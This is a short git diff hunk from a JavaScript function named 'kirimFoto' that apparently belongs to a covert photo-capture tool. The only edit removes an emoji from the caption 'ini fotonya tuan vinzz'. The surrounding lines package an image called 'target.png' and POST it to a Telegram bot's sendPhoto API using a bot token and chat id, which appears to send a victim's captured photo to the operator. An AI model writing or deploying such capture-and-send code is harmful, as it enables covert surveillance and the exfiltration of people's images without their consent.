@@ -57,7 +57,7 @@ async function kirimFoto() {
         const formData = new FormData();
         formData.append("chat_id", chat_id);
         formData.append("photo", blob, "target.png");
-        formData.append('caption', '📸 ini fotonya tuan vinzz');
+        formData.append('caption', 'ini fotonya tuan vinzz');
 
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
